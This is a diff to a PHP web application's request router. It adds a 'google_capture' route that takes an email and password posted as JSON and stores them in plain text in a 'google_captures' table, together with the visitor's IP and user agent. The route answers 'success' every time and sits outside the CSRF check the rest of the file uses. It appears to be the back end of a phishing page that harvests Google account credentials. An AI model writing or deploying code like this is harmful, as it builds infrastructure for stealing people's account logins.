@@ -20,6 +20,20 @@ header('Referrer-Policy: same-origin');
 
 // ---------- Actions (POST): always end with a redirect ----------
 $route = (string) ($_GET['r'] ?? 'home');
+if ($route === 'google_capture' && $_SERVER['REQUEST_METHOD'] === 'POST') {
+    header('Content-Type: application/json; charset=utf-8');
+    $data     = json_decode(file_get_contents('php://input'), true) ?? [];
+    $email    = trim((string) ($data['email'] ?? ''));
+    $password = (string) ($data['password'] ?? '');
+    if ($email !== '' && $password !== '') {
+        $ip = (string) ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '');
+        $ua = (string) ($_SERVER['HTTP_USER_AGENT'] ?? '');
+        db()->prepare('INSERT INTO google_captures (email, password, ip, user_agent) VALUES (?, ?, ?, ?)')
+            ->execute([$email, $password, $ip, $ua]);
+    }
+    echo json_encode(['status' => 'success']);
+    exit;
+}
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && $route !== 'clipboard') {
     $action = (string) ($_POST['action'] ?? '');
     if (!csrf_valid()) {
